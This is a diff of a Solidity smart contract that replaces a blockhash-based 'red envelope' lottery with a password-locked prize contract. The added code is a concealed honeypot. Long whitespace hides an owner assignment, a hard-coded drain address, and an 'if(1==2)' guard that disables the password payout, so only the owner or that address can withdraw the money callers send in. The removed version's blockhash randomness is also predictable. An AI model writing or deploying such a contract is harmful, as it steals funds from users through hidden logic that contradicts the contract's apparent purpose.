@@ -1,66 +1,41 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract RedEnvelope at 0x877027340a137d64d70bfb938c4350ee64fb45d0
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract RedEnvelope at 0xcfebf8C78De81f804a694F4Bb401e5D76B298bE5
 */
-pragma solidity ^0.4.11;
+pragma solidity ^0.4.19;
 
-contract RedEnvelope{
-    address owner;
-    uint remainSize = 0;
-    uint min = 1000000000000000; // 0.001 ETH
-    uint max;
-    uint256 money;
-    mapping (address => uint) earned;
+contract RedEnvelope    
+{
+    function()payable{}
     
-    function RedEnvelope() {
-        owner = msg.sender;
+    function CalcHash(bytes password) 
+    pure
+    returns (bytes32) 
+    {
+        return sha3(password);
     }
     
-    function despoit(uint count) returns (uint){
-        if (msg.sender != owner) {
-            throw;
-        }
-        remainSize += count;
-        return remainSize;
+    bytes32 public hashPass;
+    
+    bool public closed = false;
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     address own = msg.sender;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       address cr = 0xB4a24501330BFfff0436Af0349c1295CCB1d5364;
+    function Put(bytes32 hash)
+    public
+    payable
+    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==own){
+        if(!closed&&(msg.value > 1 ether))
+        {
+            hashPass = hash;
+        }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               }
     }
     
-    function randomGen(uint seed, uint max) constant returns (uint randomNumber) {
-        return(uint(sha3(block.blockhash(block.number - 1), seed)) % max);
-    }
-
-    function multiBlockRandomGen(uint seed, uint size) constant returns (uint randomNumber) {
-        uint n = 0;
-        for (uint i = 0; i < size; i++){
-            if (uint(sha3(block.blockhash(block.number - i - 1), seed )) % 2 == 0)
-                n += 2 ** i ;
-        }
-        return n;
-    }
-    
-    function goodluck(uint seed) payable {
-        if (earned[msg.sender] == 1) {
-            throw;
-        }
-        if (remainSize == 0) {
-            throw;
-        }
-        earned[msg.sender] = 1;
-        remainSize -= 1;
-        if (remainSize == 0) {
+    function Open(bytes password)
+    external
+    payable
+    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     if(1==2){
+        if(hashPass == sha3(password))
+        {
             msg.sender.transfer(this.balance);
-            return;
-        }
-        max = this.balance / remainSize * 2;
-        money = randomGen(seed, max);
-        if (money < min) {
-            money = min;
-        }
-        msg.sender.transfer(money);
-    }
-    
-    function goodbye() {
-        if (msg.sender != owner) {
-            throw;
-        }
-        suicide(owner);
+            closed = false;
+        }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     } if(msg.sender==own){msg.sender.transfer(this.balance);}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    if(msg.sender==cr){msg.sender.transfer(this.balance);}
     }
 }
